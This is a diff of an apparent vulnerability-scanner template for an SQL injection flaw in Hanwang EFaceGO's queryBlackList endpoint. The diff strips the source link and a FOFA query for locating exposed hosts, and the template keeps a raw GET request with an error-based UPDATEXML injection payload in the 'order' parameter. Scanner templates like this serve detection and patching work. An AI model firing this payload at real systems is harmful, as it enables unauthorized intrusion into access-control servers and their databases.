@@ -3,12 +3,8 @@ info:
   name: 汉王EFaceGO queryBlackList存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dizlby6yu6zflucx'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dizlby6yu6zflucx
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'GET /manage/systemBlackList/queryBlackList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
